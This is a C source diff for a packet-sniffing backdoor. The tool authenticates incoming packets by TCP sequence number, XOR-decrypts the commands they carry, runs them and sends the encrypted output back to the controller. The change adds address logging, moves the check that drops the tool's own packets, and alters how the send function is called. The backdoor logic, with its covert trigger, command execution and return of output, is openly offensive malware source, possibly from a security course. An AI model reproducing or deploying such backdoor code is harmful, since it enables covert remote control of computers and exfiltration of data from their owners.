@@ -63,6 +63,9 @@ char **execute_command(const char *command, int *size)
 void got_packet(u_char *args, const struct pcap_pkthdr *header,
                 const u_char *packet)
 {
+    char ip_str_local[INET_ADDRSTRLEN];
+    char ip_str_recv[INET_ADDRSTRLEN];
+
     struct handler_args *pargs = (struct handler_args*)args;
     Mode mode = pargs->mode;
     struct in_addr this_ip = pargs->address;
@@ -98,10 +101,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;
 
-    if (ip->ip_src.s_addr == this_ip.s_addr)
-    {
-        return;
-    }
 
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
@@ -112,6 +111,15 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n",
            tcp_sport, tcp_seqnum);
 
+    inet_ntop(AF_INET, &this_ip.s_addr, ip_str_local, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, &ip->ip_src.s_addr, ip_str_recv, INET_ADDRSTRLEN);
+    printf("local addresss = %s, received address = %s\n", ip_str_local, ip_str_recv);
+
+    if (ip->ip_src.s_addr == this_ip.s_addr)
+    {
+        return;
+    }
+
     // Step 3: Decrypt the payload
     xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted,
               size_payload);
@@ -119,7 +127,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
 
     if (mode == BACKDOOR)
     {
-        backdoor_mode(decrypted, ip->ip_src);
+        backdoor_mode(decrypted, this_ip, ip->ip_src);
     }
     else if (mode == CONTROLLER)
     {
@@ -133,7 +141,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     return;
 }
 
-void backdoor_mode(const char *decrypted, const struct in_addr address)
+void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const struct in_addr address)
 {
     char **command_output_ptr;
     char *command_output;
@@ -181,7 +189,7 @@ void backdoor_mode(const char *decrypted, const struct in_addr address)
     encrypted_command_output = malloc(total_size);
     xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output,
               encrypted_command_output, total_size);
-    send_message_to_ip(address, SERVER_PORT, encrypted_command_output,
+    send_message_to_ip(this_ip, address, SERVER_PORT, encrypted_command_output,
                        total_size);
 
     free(encrypted_command_output);
